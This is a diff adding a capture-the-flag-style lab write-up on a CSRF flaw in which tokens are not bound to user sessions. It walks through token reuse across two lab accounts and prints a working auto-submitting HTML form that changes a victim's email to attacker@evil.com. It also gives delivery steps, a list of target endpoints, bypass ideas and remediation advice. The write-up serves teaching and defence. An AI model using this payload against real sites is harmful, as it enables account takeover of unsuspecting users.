@@ -1287,3 +1287,441 @@ This = broken protection
 ---
 
 Optional CSRF token = no CSRF protection
+
+---
+
+# 🐞 Lab-4 — CSRF → Token Not Session-Bound
+
+---
+
+## 🔥 Overview (Full Theory + Insight)
+
+This lab demonstrates a CSRF vulnerability where tokens exist but are **not tied to user sessions**.
+
+---
+
+Normally:
+
+A CSRF token must be:
+
+✔ Unique per user  
+✔ Bound to session  
+✔ Verified strictly  
+
+---
+
+However, in this lab:
+
+Tokens are valid **across different users**
+
+---
+
+👉 This allows attackers to reuse their own token to perform actions on victim accounts.
+
+---
+
+## 🧠 🟦 Core Idea
+
+If CSRF token is reusable across users → protection is broken
+
+---
+
+## 🧠 🟥 Key Exploit
+
+```
+csrf=ATTACKER_TOKEN
+```
+
+---
+
+👉 Works for any logged-in user session
+
+---
+
+## 🔍 🧠 What Is This Topic?
+
+### 🔹 CSRF Token Not Bound to Session
+
+A flaw where CSRF tokens are globally valid instead of user-specific
+
+---
+
+## 🧪 🟩 Lab Walkthrough (STEP-BY-STEP)
+
+---
+
+### 🧩 Step 1 — Capture Request (User 1)
+
+Login:
+
+```
+wiener : peter
+```
+
+---
+
+Captured request:
+
+```
+POST /my-account/change-email
+
+email=test@test.com
+csrf=TOKEN_A
+```
+
+---
+
+![user1-csrf](../images/user1-csrf.png)
+
+---
+
+### 🧠 Observation
+
+```
+Valid CSRF token exists
+```
+
+---
+
+### 🧩 Step 2 — Test with Another User (User 2)
+
+Login:
+
+```
+carlos : montoya
+```
+
+---
+
+Send same request with reused token:
+
+```
+POST /my-account/change-email
+
+email=test@test.com
+csrf=TOKEN_A
+```
+
+---
+
+![user2-csrf-reuse](../images/user2-csrf.png)
+
+---
+
+### 🧠 Result
+
+✔ Request accepted  
+✔ Token from user1 works for user2  
+
+---
+
+### 🧩 Step 3 — Confirm Vulnerability
+
+```
+CSRF token is NOT session-bound
+```
+
+---
+
+👉 Any valid token works globally
+
+---
+
+### 🧩 Step 4 — Build CSRF Exploit
+
+```
+<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
+  <input type="hidden" name="email" value="attacker@evil.com">
+  <input type="hidden" name="csrf" value="TOKEN_A">
+</form>
+
+<script>
+document.forms[0].submit();
+</script>
+```
+
+---
+
+![final-payload](../images/final-payload-csrf.png)
+
+---
+
+### 🧩 Step 5 — Deliver Exploit
+
+```
+Host on exploit server
+Send to victim
+```
+
+---
+
+👉 Victim browser:
+
+✔ Sends session cookie  
+✔ Includes attacker token  
+✔ Request accepted  
+
+---
+
+### 🧩 Step 6 — Result
+
+```
+Email changed using reused CSRF token
+```
+
+---
+
+## 💣 🟨 Payload Breakdown (Easy)
+
+---
+
+### 🔹 CSRF Token
+
+```
+csrf=TOKEN_A
+```
+
+---
+
+### 🔹 Form
+
+```
+<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
+```
+
+---
+
+### 🔹 Hidden Inputs
+
+```
+<input type="hidden" name="email" value="attacker@evil.com">
+<input type="hidden" name="csrf" value="TOKEN_A">
+```
+
+---
+
+### 🔹 Auto Submit
+
+```
+<script>
+document.forms[0].submit();
+</script>
+```
+
+---
+
+## 🌍 🟥 Real-World Scenarios
+
+---
+
+### 🔥 Scenario 1 — Account Takeover
+
+```
+Reuse token → change email → reset password
+```
+
+---
+
+### 🔥 Scenario 2 — Banking Systems
+
+```
+Reuse token → transfer funds
+```
+
+---
+
+### 🔥 Scenario 3 — Admin Abuse
+
+```
+Reuse token → escalate privileges
+```
+
+---
+
+### 🔥 Scenario 4 — SaaS Platforms
+
+```
+Token shared across users → full compromise
+```
+
+---
+
+## ⚔️ 🧠 Attack Chain
+
+---
+
+1️⃣ Login as attacker  
+2️⃣ Capture valid CSRF token  
+3️⃣ Switch to victim session  
+4️⃣ Reuse token  
+5️⃣ Confirm request works  
+6️⃣ Build exploit page  
+7️⃣ Deliver to victim  
+8️⃣ Browser sends request  
+9️⃣ Action executed  
+
+---
+
+## 🎯 High-Value Endpoints
+
+---
+
+### 🔹 Account
+
+```
+/change-email
+/change-password
+```
+
+---
+
+### 🔹 Financial
+
+```
+/transfer-money
+```
+
+---
+
+### 🔹 Admin
+
+```
+/add-admin
+```
+
+---
+
+### 🔹 Profile
+
+```
+/update-profile
+```
+
+---
+
+## ⚠️ 🟥 Real-World Limitations + Bypass
+
+---
+
+### ❌ Token Bound to Session
+
+👉 Attack fails
+
+---
+
+### ❌ Token Regenerated Per Request
+
+👉 Reuse fails
+
+---
+
+### ❌ SameSite Cookies
+
+👉 Cookies blocked
+
+---
+
+### ❌ Origin Check
+
+👉 Request rejected
+
+---
+
+### ✅ Bypass Ideas
+
+```
+Steal token via XSS
+Find global tokens
+Test token reuse across roles
+```
+
+---
+
+## 🛡️ 🔒 Remediation
+
+---
+
+### 🔴 Root Problem
+
+CSRF tokens are not bound to user sessions
+
+---
+
+### ✅ Fix 1 — Bind Token to Session
+
+```
+Each token must belong to one session only
+```
+
+---
+
+### ✅ Fix 2 — Regenerate Tokens
+
+```
+New login → new token
+```
+
+---
+
+### ✅ Fix 3 — Strict Validation
+
+```
+Verify token matches session
+Reject reused tokens
+```
+
+---
+
+### ✅ Fix 4 — SameSite Cookies
+
+```
+SameSite=Strict
+```
+
+---
+
+### ✅ Fix 5 — Origin / Referer Validation
+
+```
+Allow only same-site requests
+```
+
+---
+
+## 🧠 🟪 Mental Model
+
+---
+
+Token exists ≠ secure  
+
+---
+
+Token must be:
+
+✔ unique  
+✔ session-bound  
+✔ validated  
+
+---
+
+Otherwise → reusable = broken  
+
+---
+
+## 🎯 🧠 Final Summary
+
+---
+
+✔ CSRF token exists but improperly implemented  
+
+✔ Token reused across users  
+
+✔ Server fails to verify ownership  
+
+---
+
+## 🔥 Final One-Liner
+
+---
+
+Global CSRF token = anyone can act as anyone
